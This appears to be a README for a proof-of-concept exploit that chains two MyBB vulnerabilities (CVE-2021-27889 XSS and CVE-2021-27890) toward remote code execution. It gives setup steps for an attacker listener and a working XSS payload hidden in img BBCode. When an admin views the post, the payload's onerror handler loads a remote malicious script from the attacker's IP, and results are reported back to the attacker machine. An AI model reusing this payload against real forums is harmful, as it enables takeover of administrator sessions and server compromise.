# Mybb-XSS_SQL_RCE-POC
Mybb associate CVE-2021-27890 &amp; CVE-2021-27889 to RCE poc



**Before Use:**

There are two files here:  1.js and attack_listen.py

You should modify these two file:

**1.js:**

modify the mybb forum url and attack url:

```js
var bashurl = 'http://192.168.92.164/mybb/mybb-mybb_1825' #mybb forum url
var attack_url = 'http://192.168.92.165:8080/attack_success' #change the attack machine ip.should keep the same with the attack_listen.py
```



**attack_listen.py**

modify the attack host and attack port:

```python
attack_host = '192.168.92.165'
attack_port = 8080
```



**Usage:**

CVE-2021-27889 is xss. You should inject the following payload in "**New Post Thread**" or "**Reply**" or "**Private Messages**".In this demo,I send the payload to "New Post Thread"

*notice that the **192.168.92.165** is the evil server ip,You should change it.*

```html
[img]http://evil.com/xx(http://evil.com/onerror=xs1=String.fromCharCode(47);xa1=document.createElement(/script/.source);xa1.src=xs1+xs1+/192.168.92.165/.source+xs1+/1.js/.source;document.getElementById(/header/.source).append(xa1);//[/img]
```

![](./img/1.png)

Now Our evil js **1.js** is injected successful.Then we should wait an Admin browsed this Post with loggined admin page.

*Notice that the Admin user have no necessary loggin the forum page.*



In our waiting time,We should run the "attack_listen.py" in our attack machine, To identify if the Admin user be attacked.

```shell
python3 attack_listen.py
```



When the Admin user browsed the evil post,the evil js will do the attack:

![](./img/2.png)



We can recive the information at our attack machine:

![](./img/3.png)



![](./img/4.png)